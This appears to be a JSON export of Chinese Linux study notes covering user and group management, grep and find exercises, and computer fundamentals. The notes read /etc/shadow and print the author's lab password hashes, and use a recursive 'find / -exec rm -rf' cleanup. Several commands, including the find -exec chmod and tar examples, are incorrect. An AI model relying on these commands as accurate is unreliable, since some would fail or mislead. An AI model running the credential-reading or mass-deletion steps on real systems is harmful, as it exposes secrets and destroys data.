special）。\n用户管理1、用户&#x2F;组的基本概念用户的基本概念\n本质：访问系统资源的独立身份标识\n作用：\n登录系统\n运行进程（每个进程都有属主）\n控制文件&#x2F;目录的读写权限\n\n\n\n组的基本概念\n本质：用户的集合，用于批量管理权限\n作用：\n简化权限分配（如允许某组共同编辑文件）\n控制资源共享（如打印机、目录）\n\n\n\n2、用户的作用查看当前登录的用户\n12[root@wyf 桌面]# iduid=0(root) gid=0(root) 组=0(root) 环境=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023\n\nunconfined_u：用户域未受限用户 \nunconfined_r：未受限角色 \nunconfined_t：未受限类型 \ns0-s0:c0.c1023：安全级别，最高到最低\n查看文件的owner\n123[root@wyf 桌面]# ls -l /home总用量 0drwx------. 3 wyf wyf 78 7月  28 19:38 wyf\n\n 3：硬链接个数\ncd . \tcd .. \n基础概念：\n​\t每个目录至少包含 2个硬链接： \n​\t\t目录自身的链接（通过名称访问，如 wyf） \n​\t\t子目录中的 . 条目（指向自身） \n​\t每增加一个直接子目录，计数+1（因为子目录的 .. 会指向它）\n查看运行进程的username：\n12345678910111213[root@wyf 桌面]# ps auxUSER        PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMANDroot          1  0.0  0.3 179188 13792 ?        Ss   10:50   0:02 /usr/lib/systemroot          2  0.0  0.0      0     0 ?        S    10:50   0:00 [kthreadd]root          3  0.0  0.0      0     0 ?        I&lt;   10:50   0:00 [rcu_gp]root          4  0.0  0.0      0     0 ?        I&lt;   10:50   0:00 [rcu_par_gp]root          6  0.0  0.0      0     0 ?        I&lt;   10:50   0:00 [kworker/0:0H-kroot          8  0.0  0.0      0     0 ?        I&lt;   10:50   0:00 [mm_percpu_wq]root          9  0.0  0.0      0     0 ?        S    10:50   0:00 [ksoftirqd/0]root         10  0.0  0.0      0     0 ?        I    10:50   0:00 [rcu_sched]root         11  0.0  0.0      0     0 ?        S    10:50   0:00 [migration/0]root         12  0.0  0.0      0     0 ?        S    10:50   0:00 [watchdog/0]root         13  0.0  0.0      0     0 ?        S    10:50   0:00 [cpuhp/0]\n\nPID：进程id \n%CPU：CPU使用率 \n%MEM：内存使用百分比 \nVSZ：虚拟内存 \nRSS：常驻内存 \nTTY：关联的终端设备 \nSTAT：进程状态码 \nSTART：进程的启动时间 \nTIME：累计cpu使用时间 \nCOMMAND：进程对应的命令\n3、用户组存储的信息用户基本信息文件 &#x2F;etc&#x2F;passwd12345678[root@wyf 桌面]# cat /etc/passwdroot:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdown\n\n\n\n\n字段位置\n字段值\n含义解析\n\n\n\n1\nroot\n用户名 - 超级管理员账户的登录名\n\n\n2\nx\n密码标记 - 表示加密密码存储在 /etc/shadow 文件（增强安全性）\n\n\n3\n0\n用户ID（UID） - 0 表示超级用户权限（最高权限账户）\n\n\n4\n0\n组ID（GID） - 0 表示主组是 root 组（系统管理员组）\n\n\n5\nroot\n用户描述 - 账户的说明信息（可以是全名、备注等）\n\n\n6\n/root\n家目录 - 用户专属目录，存放个人文件和配置（root用户家目录在&#x2F;root）\n\n\n7\n/bin/bash\n登录Shell - 用户登录后默认的命令行解释器（Bash Shell）\n\n\n1.用户名 \n​\t登录系统的名字（如 root ）。\n2.密码占位符：\n​\t实际密码存储在  &#x2F;etc&#x2F;shadow ，此处为 x。 \n3.UID（用户身份证号）\n​\t系统约定（RHEL7）： \n​\t\t0 ：特权用户（root） \n​\t\t1~999 ：系统用户 \n​\t\t1000+ ：普通用户 \n​\tRoot 用户特性： \n​\t\tuid 为 0，拥有最高权限。 \n​\t\t可覆盖文件系统权限、管理软件和系统文件。 \n​\t\t控制大多数硬件设备。 \n4.GID（组号）  \n​\t默认规则： \n​\t\t每创建一个用户，系统会自动创建同名组。 \n5.描述\n​\t用户描述信息（如职位、部门），默认与用户名一致。 \n6.家目录（HOME） \n​\t用户登录后的默认目录（如  &#x2F;root ）。 \n7.登录 Shell  \n​\t用户的命令解释器（如  &#x2F;bin&#x2F;bash ）。 \n​\t若设置为  &#x2F;sbin&#x2F;nologin ，用户无法登录系统。\n用户密码信息文件  &#x2F;etc&#x2F;shadow12[root@wyf 桌面]# cat /etc/shadowroot:$6$.BrPz6ym6rOpU8t/$WQt1myKX0d.y2nvKSO.q8NBbZUR6Y6BrRRC5.MVSNm10G.pjSs.oMVdbKw2UznmJ115j/nJ.o3/289jx1UZBm/::0:99999:7:::\n\n\n\n\n字段位置\n字段值示例\n含义解析\n\n\n\n1\nroot\n用户名 - 账户标识\n\n\n2\n$6$...ZBm/\n加密密码 - 存储密码的哈希值（详解见下）\n\n\n3\n空\n最后修改密码日期 - 空值表示需要首次登录设置密码\n\n\n4\n0\n最小密码年龄 - 0 表示随时可修改\n\n\n5\n99999\n最大密码年龄 - 密码有效期 99999 天≈273年（永不过期)\n\n\n6\n7\n过期前警告期 - 密码到期前 7 天提醒\n\n\n7\n空\n密码宽限期 - 过期后立即失效（无宽限）\n\n\n8\n空\n账户过期时间 - 空值表示账户永不过期\n\n\n9\n空\n保留字段 - 未使用\n\n\n\n用户名 (root)账户的登录名。\n\n加密密码 ($6$...)\n\n格式：$id$salt$encrypted\n\n分解：\n\n$6$：表示使用 SHA-512加密算法（Linux最安全的默认算法）\n\n\n\n符号\n算法\n\n\n\n$1$\nMD5（已淘汰）\n\n\n$5$\nSHA-256\n\n\n$6$\nSHA-512\n\n\n\n$.BrPz6ym6rOpU8t/：盐值（Salt），用于增加密码破解难度\n\n$WQt1myKX0d...：加密后的密码哈希值\n\n\n\n\n\n上次更改密码日期\n\n空字段：通常表示密码按特殊规则管理（如通过passwd -d root清除密码后，此处为空）\n正常情况为数字：表示从1970年1月1日（UNIX纪元）到更改日的天数（如 19122）\n\n\n最小使用天数 (0)\n\n密码更改后必须经过该天数才允许再次更改\n0 → 允许立即更改密码（默认安全配置）\n\n\n最大使用天数 (99999)\n\n密码过期前的最大使用天数\n99999 ≈ 273年 → 表示密码永不过期（生产环境建议设为90或180天）\n\n\n警告天数 (7)\n\n密码到期前 7 天开始向用户发送警告（登录时提示）\n\n\n密码宽限期\n\n空 → 密码过期后立即锁定账户\n若设为数字（如 5）→ 过期后仍允许使用5天\n\n\n账户过期日期\n\n空 → 账户永不过期\n若设为数字 → 表示从1970年1月1日起的账户过期天数\n\n\n保留字段留作未来扩展使用。\n\n\n注意事项：\n​\t密码字段为空：用户无需密码即可登录（高风险，不推荐）。 \n​\t锁定账号：在密码字段前添加 * 或 !!。 \n​\t时间计算基准：不同系统可能以不同时间为起点（如 SCOLinux 使用 1970年1月1日）。\n组信息文件  &#x2F;etc&#x2F;group123456[root@wyf 桌面]# cat /etc/grouproot:x:0:bin:x:1:daemon:x:2:sys:x:3:adm:x:4:\n\n\n\n\n字段位置\n字段值\n含义解析\n\n\n\n1\nroot\n组名 - 系统管理员组\n\n\n2\nx\n密码占位符 - 表示密码存储在 /etc/gshadow 文件\n\n\n3\n0\n组ID (GID) - 0 表示管理员组（系统最高权限组）\n\n\n4\n空\n组成员列表 - 没有直接列出成员\n\n\n4、用户管理1.用户创建1.1 默认创建（自动生成同名基本组）123[root@wyf 桌面]# useradd user01[root@wyf 桌面]# id user01uid=1001(user01) gid=1001(user01) 组=1001(user01)\n\n说明： \n​\t用户编号（UID）：唯一用户标识（如  1001 ）。 \n​\t组编号（GID）：同名基本组的标识（如  1001 ）。 \n​\t规则：未指定选项时，系统自动创建同名组作为用户的主组（Primary Group）。\n1.2 指定选项创建12[root@localhost ~]# useradd user02 -u 1503                          # 指定 UID[root@localhost ~]# useradd user03 -d /user03 /home/user03          # 指定家目录\n\n2.用户删除1[root@localhost ~]# userdel -r user02  # 彻底删除用户及家目录\n\n注意事项：\n​\t-r 选项会删除用户家目录和邮箱文件（ &#x2F;var&#x2F;spool&#x2F;mail ）。 \n​\t未加 -r 会导致残留文件，可能影响后续创建同名用户。\n​\t有进程在使用需要先结束进程\n12kill -9 uid               #结束进程pkill -9 -u user01\n\n删除用户时没有加 -r 的补救方式\n123456789101、pkill -9 -u user01            #强制关闭进程2、sudo rm -rf /home/user01      # 删除家目录sudo rm -f /var/mail/user01     # 删除邮件池（如果有）3、#列出所有属于user01的文件，并删除，需要2&gt;/dev/null用于忽略权限错误find / -user user01 -exec rm -rf &#123;&#125; \\; 2&gt;/dev/null4、#删除配置文件信息vipw    \t#/etc/passwdvigr    \t#/etc/groupvipw -s\t\t#/etc/shadowvisudo  \t# 安全编辑方式\n\n3.用户密码管理1[root@localhost ~]# passwd alice  # 输入两次新密码\n\n1[wyf@localhost ~]# passwd  # 需输入原密码\n\n4.用户属性修改1[root@localhost ~]# usermod -s /sbin/nologin user02  # 禁用用户登录\n\n5.组成员管理将用户追加到附加组\n1234567# 语法usermod -aG 组名 用户名# 示例[root@localhost ~]# usermod -aG hr user02# 验证[root@localhost ~]# id user02uid=1002(user02) gid=1002(user02) 组=1002(user02),1005(hr)\n\n从组中移除用户\n1234# 语法gpasswd -d 用户名 组名# 示例[root@localhost ~]# gpasswd -d user02 hr\n\n5、用户组管理1.组基础操作创建组\n1234567# 默认创建[root@localhost ~]# groupadd hr# 指定 GID[root@localhost ~]# groupadd net01 -g 1007# 验证[root@localhost ~]# grep &#x27;net01&#x27; /etc/groupnet01:x:1007:\n\n删除组\n1[root@localhost ~]# groupdel net01\n\n2.组分类1.基本组​\t\t随用户自动创建的同名组（如  user01 组）。 用户文件默认属组为基本组。 \n2.附加组​\t\t用户手动加入的其他组（如 hr 组）。 用于扩展权限管理。\n3.组成员管理示例1.创建共享目录123mkdir /sharedchgrp hr /shared  # 设置属组为hrchmod 770 /shared  # 赋予组读写执行权限\n\n2. 验证权限12su - user02touch /shared/test.txt  # 成功则权限生效\n\n注意事项1.修改 UID&#x2F;GID 前备份：1bash find / -user 旧UID -exec chown 新UID &#123;&#125; \\;  # 修复文件属主 \n\n2.组权限生效条件：用户需重新登录或使用  newgrp 命令。 \n3.删除用户必用 -r：避免残留文件导致后续操作失败。\n6、实验练习实验目标1.掌握用户和组的创建、删除及属性修改。 \n2.理解用户配置文件（ &#x2F;etc&#x2F;passwd 、 &#x2F;etc&#x2F;shadow 、 &#x2F;etc&#x2F;group ）的结构。\n3.学会设置用户密码、组成员权限及共享目录访问控制。\n1、创建用户与验证基本信息1.默认创建用户user01：12345[root@wyf 桌面]# useradd user01[root@wyf 桌面]# id user01uid=1001(user01) gid=1001(user01) 组=1001(user01)[root@wyf 桌面]# tail -n 1 /etc/passwduser01:x:1001:1001::/home/user01:/bin/bash\n\n2.指定选项创建用户：创建用户 user02 ，指定 UID 为  bash 1503 ：\n123[root@wyf 桌面]# useradd user02 -u 1503[root@wyf 桌面]# id user02uid=1503(user02) gid=1503(user02) 组=1503(user02)\n\n创建用户  user03 ，指定家目录为  &#x2F;user03 ：\n123[root@wyf 桌面]# useradd user03 -d /user03[root@wyf 桌面]# ls -ld /user03drwx------. 3 user03 user03 78 7月  31 20:38 /user03\n\n2、用户密码管理1.Root 为用户  user01 设置密码：12345678[root@wyf 桌面]# passwd user01更改用户 user01 的密码 。新的 密码：无效的密码： 密码少于 8 个字符重新输入新的 密码：passwd：所有的身份验证令牌已经成功更新。[root@wyf 桌面]# grep user01 /etc/shadowuser01:$6$o/lquzz3Zgu/OMKF$Qm2qNpEVDi25hQ45x73nw1ewXWVOTZPo.h88HzPkWPMHNrOWLbTpRKG.nnT9OdsTQH0Y4gcVSe8eiMnp9NtX3.:20300:0:99999:7:::\n\n2.用户  user01 自行修改密码：123456789[user01@wyf ~]# passwd更改用户 user01 的密码 。Current password: 新的 密码：重新输入新的 密码：passwd：所有的身份验证令牌已经成功更新。[user01@wyf ~]# exit注销[root@wyf 桌面]# \n\n3、修改用户属性1. 禁用用户  user02 的登录 Shell：1234[root@wyf 桌面]# usermod -s /sbin/nologin user02[root@wyf 桌面]# grep user02 /etc/passwduser02:x:1503:1503::/home/user02:/sbin/nologin[root@wyf 桌面]# \n\n2.尝试登录  user02 （应失败）：123[root@wyf 桌面]# su - user02This account is currently not available.[root@wyf 桌面]# \n\n4、用户组管理1.创建组  hr 和 dev：123456[root@wyf 桌面]# groupadd hr[root@wyf 桌面]# groupadd dev -g 2000[root@wyf 桌面]# tail -n 2 /etc/grouphr:x:1505:dev:x:2000:[root@wyf 桌面]# \n\n2.将用户加入附加组：123456[root@wyf 桌面]# usermod -aG hr user01[root@wyf 桌面]# usermod -aG dev user02[root@wyf 桌面]# id user01uid=1001(user01) gid=1001(user01) 组=1001(user01),1505(hr)[root@wyf 桌面]# id user02uid=1503(user02) gid=1503(user02) 组=1503(user02),2000(dev)\n\n3.从组中移除用户：1234[root@wyf 桌面]# gpasswd -d user01 hr正在将用户“user01”从“hr”组中删除[root@wyf 桌面]# id user01uid=1001(user01) gid=1001(user01) 组=1001(user01)\n\n5、共享目录权限验证1. 创建共享目录并设置权限：12345[root@wyf 桌面]# mkdir /shared[root@wyf 桌面]# chgrp dev /shared[root@wyf 桌面]# chmod 770 /shared[root@wyf 桌面]# ls -ld /shareddrwxrwx---. 2 root dev 6 7月  31 20:51 /shared\n\n2.验证组成员权限：用户 user02 （属于 dev 组）：\n12345[root@wyf 桌面]# su - user02[user02@wyf ~]# touch /shared/test.txt[user02@wyf ~]# exit注销[root@wyf 桌面]# \n\n用户 user01 （不在  dev 组）：\n123456[root@wyf 桌面]# su - user01[user01@wyf ~]# touch /shared/test.txttouch: 无法创建 &#x27;/shared/test.txt&#x27;: 权限不够[user01@wyf ~]# exit注销[root@wyf 桌面]# \n\n6、清理实验环境1.删除用户及其家目录123userdel -r user01userdel -r user02userdel -r user03\n\n2.删除组12groupdel hrgroupdel dev\n\n3.删除共享目录1rm -rf /shared\n\n7、实验总结核心知识点  \n1.用户管理：​\tuseradd 、 usermod 、 userdel 命令的使用。 \n​\t用户密码策略通过  &#x2F;etc&#x2F;shadow 控制。 \n​\t禁用登录 Shell 可限制用户访问。 \n2.组管理：​\tgroupadd 、 groupdel 、 gpasswd 命令的使用。 \n​\t基本组（自动创建）与附加组（手动加入）的区别。 \n​\t通过组权限实现共享目录的访问控制。 \n3.权限验证：​\t使用 id 查看用户组关系。 \n​\t通过 ch grp 和  chmod 设置目录权限。\n","slug":"VIM-编辑器与用户管理","date":"2025-07-30T11:03:12.000Z","categories_index":"","tags_index":"Linux","author_index":"wyf"},{"id":"7e1e754a6541fda39aaf072fd6373097","title":"Linux文件管理与查询","content":"Linux文件管理与查询一、grep命令基础语法1grep [选项] &quot;搜索模式&quot; 文件或目录\n\n常用选项\n正则表达式1. 基础语法\n. (点)：匹配任意单个字符\n1grep &quot;a.c&quot; file.txt  # 匹配 &quot;abc&quot;, &quot;aac&quot;, &quot;a1c&quot; 等\n\n*：匹配前一个字符0次或多次\n1grep &quot;ab*c&quot; file.txt  # 匹配 &quot;ac&quot;, &quot;abc&quot;, &quot;abbc&quot; 等\n\n[]：匹配括号内的任意字符\n12grep &quot;[aeiou]&quot; file.txt   # 匹配任意元音字母grep &quot;[0-9]&quot; file.txt     # 匹配任意数字\n\n[^]：匹配不属于括号内指定字符集的单个字符\n1grep &quot;[^0-9]&quot; file.txt     # 匹配非数字字符\n\n2. 位置锚定\n^：匹配行首\n1grep &quot;^start&quot; file.txt  # 匹配以 &quot;start&quot; 开头的行\n\n$：匹配行尾\n1grep &quot;end$&quot; file.txt  # 匹配以 &quot;end&quot; 结尾的行\n\n3. 扩展正则表达式（需 -E）使用 grep -E 或 egrep 启用高级语法：\n\n+：匹配前一个字符至少1次\n1grep -E &quot;a+&quot; file.txt  # 匹配 &quot;a&quot;, &quot;aa&quot;（等价于 aa*）\n\n?：匹配前一个字符0或1次\n1grep -E &quot;colou?r&quot; file.txt  # 匹配 &quot;color&quot; 或 &quot;colour&quot;\n\n|：或匹配\n1grep -E &quot;cat|dog&quot; file.txt  # 匹配 &quot;cat&quot; 或 &quot;dog&quot;\n\n()：分组\n1grep -E &quot;(abc)&#123;2&#125;&quot; file.txt  # 匹配 &quot;abcabc&quot;\n\n&#123;&#125;：用于 精确控制前一个字符&#x2F;模式的重复次数\n\n&#123;n&#125;：精确重复 n 次\n&#123;n,&#125;：重复至少 n 次\n&#123;n,m&#125;：重复 n 到 m 次\n\n1grep -E &quot;go&#123;3,5&#125;gle&quot; file.txt  # 匹配 &quot;gooogle&quot; 和 &quot;goooogle&quot;，但不匹配 &quot;google&quot;\n\n使用 grep 时，可以通过 正则表达式（Regular Expressions） 实现高效文本匹配。以下是常见用法和示例：\n4. 字符类\n\\w：字母、数字、下划线（等价于 [a-zA-Z0-9_]）\n\\d：数字（等价于 [0-9]）\n\\s：空白字符（空格、制表符等）\n\n实验练习准备：创建practice.txt文件，在桌面上打开终端\n1vim practice.txt\n\n在vim编辑器里将下面内容复制进去，保存后退出，在桌面上得到一个practice.txt文件\n\n实验练习：实验 1.1：查找错误日志1grep &quot;ERROR&quot; practice.txt                #输出所有包含 &quot;ERROR&quot; 的行\n\n\n实验 1.2：忽略大小写匹配12grep -i &quot;error&quot; practice.txt             #匹配 &quot;error&quot;（不区分大小写）grep -i &quot;warning&quot; practice.txt           #匹配 &quot;WARNING&quot;（不区分大小写）\n\n\n实验 1.3：反向排除调试信息1grep -v &quot;WARNING&quot; practice.txt            #排除包含 &quot;WARNING&quot; 的行\n\n\n实验 2.1：显示匹配行号1grep -n &quot;ERROR&quot; practice.txt              #输出行号，如 `2:...[ERROR]...`\n\n\n实验 2.2：统计错误次数1grep -c &quot;ERROR&quot; practice.txt              #输出错误行数（示例结果：3）\n\n\n实验 3.1：查看错误上下文12grep -C 1 &quot;ERROR&quot; practice.txt            #显示每个 &quot;ERROR&quot; 行及其前后各 1 行grep -C 2 &quot;ERROR&quot; practice.txt            #显示每个 &quot;ERROR&quot; 行及其前后各 2 行\n\n\n\n实验 4.1：匹配时间范围12grep &quot;2023-10-01 08:1.&quot; practice.txt          #匹配 08:10 以后的行grep &quot;^2023-10-01 08:1&quot; practice.txt          #匹配行首为2023-10-01 08:1 的行\n\n\n\n实验 4.2：提取 IP 地址1grep -Eo &quot;([0-9]&#123;1,3&#125;\\.)&#123;3&#125;[0-9]&#123;1,3&#125;&quot; practice.txt    #输出所有 IP 地址，如 192.168.1.100\n\n\n1grep -E &quot;([0-9]&#123;1,3&#125;\\.)&#123;3&#125;[0-9]&#123;1,3&#125;&quot; practice.txt     #输出含有 IP 地址的行，如 192.168.1.100\n\n\n实验 4.3：精确匹配警告1grep -w &quot;WARNING&quot; practice.txt             #精确匹配&quot;WARNING&quot;\n\n\n实验 5.1：提取邮箱地址12grep -Eio &quot;\\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Z]&#123;2,&#125;\\b&quot; practice.txt     #输出邮箱地址grep -Eio &quot;\\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\\.[A-Z]&#123;2,&#125;\\b&quot; practice.txt\n\n\n实验 5.2：查找金额记录1grep &#x27;\\$&#x27; practice.txt\n\n\n实验 6.1：扩展练习（目录递归）1234# 创建目录结构mkdir -p /tmp/practice/logs/cp practice.txt /tmp/practice/logs/echo &quot;ERROR: File not found&quot; &gt; /tmp/practice/error.log\n\n\n12# 递归搜索所有 &quot;ERROR&quot;grep -r &quot;ERROR&quot; /tmp/practice/\n\n\n12# 排除 .log 文件 --exclude=&quot;*.log&quot; 排除所有 .log grep -r --exclude=&quot;*.log&quot; &quot;INFO&quot; /tmp/practice/\n\n\n二、find命令基础语法1find [搜索路径] [匹配条件] [执行动作]\n\n常用匹配条件按名称或路径匹配\n按文件类型匹配\n按文件大小匹配\n按时间戳匹配\n按权限匹配\n逻辑操作符\n执行动作\n实验练习准备创建练习目录结构\n12345mkdir -p ~/find-practice/&#123;logs,data,backup&#125;touch ~/find-practice/logs/&#123;app.log,error.log&#125;touch ~/find-practice/data/&#123;file1.txt,file2.csv,image.jpg&#125;mkdir ~/find-practice/backup/oldtouch ~/find-practice/backup/old/archive.tar.gz\n\n实验练习实验 1.1：按名称搜索文件1find ~/find-practice/ -name &quot;*.log&quot;            #输出所有 .log 文件的路径\n\n\n实验 1.2：按类型搜索目录1find ~/find-practice -type d                   #列出所有子目录\n\n\n实验 1.3：组合条件（名称与大小）1find ~/find-practice -name &quot;*.jpg&quot; -size -10k  #查找小于 10KB 的 .jpg 文件\n\n\n实验 2.1：查找最近修改的文件1find ~/find-practice -mtime -1          # 列出 1 天内修改过的文件\n\n\n实验 2.2：排除特定权限文件1find ~/find-practice ! -perm 644     # 查找权限不是 644 的文件\n\n\n\n\n\n需求\n权限\n字母表示\n\n\n\n私有文件\n600\n-rw-------\n\n\n标准共享\n644\n-rw-r--r--\n\n\n组内共享\n664\n-rw-rw-r--\n\n\n可执行文件\n755\n-rwxr-xr-x\n\n\n共享目录\n775\ndrwxrwxr-x\n\n\n实验 3.1：删除空文件1find ~/find-practice -size 0 -delete     # 删除所有空文件\n\n\n实验 3.2：批量修改权限1find ~/find-practice -name &quot;*.sh&quot; -exec &#123;&#125; chmod &#123;&#125; 755 \\;             # 将所有 .sh 文件设为可执行\n\n实验 3.3：搜索并压缩文件12touch ~/find-practice/logs/&#123;app.log,error.log&#125;find ~/find-practice -name &quot;*.log&quot; -exec tar -cvsf logs.tar.gz &#123;&#125; +   # 将 .log 文件打包为 logs.tar.gz\n\n\ntar命令\n\n\n\n选项\n作用\n常见用法\n\n\n\n-c\n创建新归档文件\n必选（创建模式）\n\n\n-v\n显示详细过程（verbose）\n可选（显示打包文件列表）\n\n\n-s\n已废弃 原始排序（obsolete sort）\n现代 tar 已忽略此选项\n\n\n-f\n指定归档文件名\n必选（后接文件名）\n\n\n实验 4.1：忽略特定目录1find ~/find-practice -path &quot;*/backup&quot; -prune -o -name &quot;*.txt&quot; -print  # 查找所有 .txt 文件，但跳过 backup 目录\n\n提前创建了一个111.txt\n\n实验 4.2：结合  xargs 处理文件xargs 是 Linux&#x2F;Unix 系统中一个极其强大的命令行工具，用于构建和执行命令行参数。它弥补了管道(|)只能传递标准输出的不足，将输入数据转换为命令参数。\n1[命令产生输入] | xargs [选项] [目标命令]\n\n\n\n\n选项\n作用\n示例\n\n\n\n-I &#123;&#125;\n自定义占位符\n&#96;ls\n\n\n-n N\n每组N个参数\n&#96;seq 10\n\n\n-P N\n并发进程数\n&#96;find .\n\n\n-t\n打印执行命令\n&#96;echo “f”\n\n\n-p\n交互式确认\n&#96;ls\n\n\n-0\n处理特殊字符\n&#96;find -print0\n\n\n-d\n自定义分隔符\n&#96;echo “a,b,c”\n\n\n1find ~/find-practice -name &quot;*.csv&quot; | xargs -I &#123;&#125; mv &#123;&#125; ~/find-practice/data    #移动所有 .csv 文件到 data 目录\n\n常用场景\n案例学习1、找出系统中名为 passwd的文件1find / -name passwd -type f\n\n\n2、找出&#x2F;tmp目录中文件名带nz的文件，然后删除由于&#x2F;tmp目录下没有带nz的文件，所以先创建几个文件\n\n1find /tmp -name &quot;*nz*&quot; -type f -exec rm -fr &#x27;&#123;&#125;&#x27; \\;\n\n\n","slug":"Linux文件管理与查询","date":"2025-07-30T02:11:06.000Z","categories_index":"","tags_index":"Linux","author_index":"wyf"},{"id":"144f0b4d9b9f80ea377106e9c6a54a45","title":"Linux基础","content":"Linux基础内容一、计算机基础1、信息表示\n比特： 信息的基本单位（0 或 1）。\n二进制系统： 计算机内部所有信息（数字、文本、图像、声音、视频、指令）都用二进制数（0 和 1 的组合）表示。\n编码： 信息转换为二进制的过程（如 ASCII, Unicode 编码字符， JPEG 编码图像， MP3 编码声音）。\n\n2、冯·诺依曼体系结构（现代计算机的基石）\n核心思想： 存储程序概念。\n五大部件：\n输入设备： 接收外部数据&#x2F;指令（键盘、鼠标、麦克风、摄像头、传感器）。\n输出设备： 向外界呈现结果（显示器、打印机、扬声器）。\n运算器： 执行算术运算和逻辑运算。\n控制器： 协调指挥各部件的运作，取指令、解码指令、执行指令。\n存储器：\n内存： 速度快、容量较小、易失性（断电数据丢失）。存放当前运行的程序和数据（RAM：Random Access Memory）。\n外存： 速度慢、容量大、非易失性（断电数据保留）。长期存储程序和数据（硬盘、固态硬盘SSD、U盘、光盘）。\n\n\n\n\n\n3、硬件：计算机的物理组成部分。\n中央处理器： 计算机的“大脑”，包含运算器和控制器。核心指标：主频、核心数、缓存大小。\n内存： 供 CPU 直接访问的高速工作区 (RAM)。\n主板： 连接所有部件的“骨架”，包含各种接口、芯片组、总线等。\n存储设备： 硬盘驱动器、固态硬盘、U 盘等。\n输入设备： 如上述。\n输出设备： 如上述。\n扩展卡： 显卡、声卡、网卡等。\n电源： 提供稳定电力。\n\n4、软件：计算机运行的指令&#x2F;程序集合。硬件是躯体，软件是灵魂。\n系统软件：\n操作系统： 管理硬件资源、提供用户&#x2F;应用程序接口、是软硬件沟通的桥梁（如：Windows, macOS, Linux, Android, iOS）。核心功能：进程管理、内存管理、文件管理、设备管理、用户界面。\n驱动程序： 使操作系统能与特定硬件设备通信的软件。\n实用工具： 辅助管理计算机的工具（如：磁盘清理、杀毒软件）。\n\n\n应用软件： 为用户完成特定任务的程序（如：浏览器、办公软件、游戏、媒体播放器、图像处理软件）。\n\n5、数据与程序\n数据： 计算机处理的原始材料（未经处理的信息）。\n程序： 一系列指令的集合，告诉计算机如何处理数据。\n指令： 计算机执行的最小操作单位（如：加、减、移动数据）。\n\n6、CPU的架构​\t\t前面说过的，CPU其实内部已经含有一些微指令，我们所使用的软件都要经过CPU内部 的微指令集来达成才行。 那这些指令集的设计主要又被分为两种设计理念，这就是目前世界 上常见到的两种主要CPU架 构，分别是：精简指令集（RISC）与复杂指令集（CISC）系统。\n\n\n\n特征\n精简指令集 (RISC)\n复杂指令集 (CISC)\n\n\n\n设计目标\n简化指令以提高单周期执行效率\n减少程序代码量，贴近高级语言操作\n\n\n指令复杂度\n简单：指令长度固定，功能单一（如LOAD/STORE）\n复杂：支持多功能指令（如单条指令实现字符串处理）\n\n\n指令长度\n固定（通常32位）\n可变（1至15字节不等）\n\n\n寄存器数量\n多（数十至数百个），减少内存访问\n较少，依赖内存操作\n\n\n执行方式\n单周期指令为主，流水线深度优化\n复杂指令需多周期执行（微程序控制）\n\n\n代码密度\n较低（相同功能需更多指令）\n较高（单条指令完成复杂任务）\n\n\n典型架构\nARM（手机&#x2F;嵌入式）、RISC-V、MIPS、PowerPC\nx86（Intel&#x2F;AMD桌面&#x2F;服务器）、z&#x2F;Architecture（IBM大型机）\n\n\n编译器作用\n关键：负责指令调度和效率优化\n简化编译（复杂指令直接映射高级操作）\n\n\n\n选择精简指令集（RISC）的场景：追求高能效比（手机&#x2F;物联网）、定制化需求（RISC-V开源生态）。\n选择复杂指令集 (CISC)的场景：兼容历史代码（x86生态）、高代码密度（存储成本敏感型系统）。\n未来方向：两者在设计上持续趋同，效率、功耗、灵活性的平衡成为关键。\n\n7、操作系统定义：操作系统是管理计算机硬件与软件资源的系统软件，扮演中介者角色：直接控制CPU、内存、磁盘、网络等硬件；为应用程序（如浏览器、游戏）提供运行环境和服务。​本质​：​资源的超级管家​（硬件资源 + 软件协调）。\n（1）进程管理（Process Management）\n进程：运行中的程序实例（需CPU、内存等资源）。\n核心任务：\n创建&#x2F;销毁进程\n进程调度：分配CPU时间片（算法如：先来先服务FCFS、轮转调度RR、优先级调度）\n进程同步：解决并发冲突（如信号量、互斥锁）\n进程通信：进程间数据交换（IPC机制）\n\n\n\n（2）内存管理（Memory Management）\n核心任务：\n分配&#x2F;回收内存：为进程动态分配空间（如堆、栈）。\n虚拟内存：将硬盘空间虚拟为内存，解决物理内存不足（通过分页&#x2F;分段技术）。\n内存保护：防止进程越权访问内存（如MMU硬件支持）。\n\n\n\n（3）文件系统管理（File System Management）\n文件：存储在磁盘上的数据逻辑单元（文本、图片等）。\n核心任务：\n组织文件：目录树结构（如Windows的C:\\、Linux的&#x2F;）。\n读写控制：提供open&#x2F;read&#x2F;write等API。\n磁盘空间管理：分配块、碎片整理（如NTFS、EXT4文件系统）。\n\n\n\n（4）设备管理（I&#x2F;O Device Management）**\n核心任务：\n设备驱动：为打印机、键盘等硬件提供统一接口。\n缓冲区管理：优化慢速设备与CPU的速率差异（如磁盘缓存）。\n即插即用：动态识别设备（如USB热插拔）。\n\n\n\n（5）安全与权限管理（Security &amp; Protection）**\n用户认证：登录密码、生物识别。\n访问控制：文件权限（如Linux的rwx权限位）。\n防火墙与加密：防止外部攻击（如Windows Defender）。\n\n\n\n\n模块\n作用\n\n\n\n内核（Kernel）\n核心代码，直接操作硬件（进程调度、中断处理、内存映射）。\n\n\n系统调用接口\n应用程序访问内核服务的接口（如Linux的syscall、Windows的API）。\n\n\n用户界面\n用户与系统交互的入口（GUI图形界面如Windows桌面 &#x2F; CLI命令行如Linux终端）。\n\n\n系统工具\n内置实用程序（任务管理器、磁盘清理、网络配置工具）。\n\n\n驱动程序\n硬件厂商提供的设备控制软件（如NVIDIA显卡驱动）。\n\n\n8、内核Kernel内核（Kernel） 是操作系统的最核心组件，直接运行在硬件之上，负责管理系统最底层的资源和关键功能。它如同计算机的“中枢神经系统”，是所有软硬件交互的必经之路。\n内核的核心职责\n硬件抽象与管理\n直接操作 CPU、内存、磁盘、网络设备 等物理硬件。\n为上层软件提供统一的资源访问接口（如内存分配、磁盘读写），隐藏硬件差异。\n\n\n进程调度\n决定哪个进程使用 CPU、何时使用、使用多久。\n通过调度算法（如 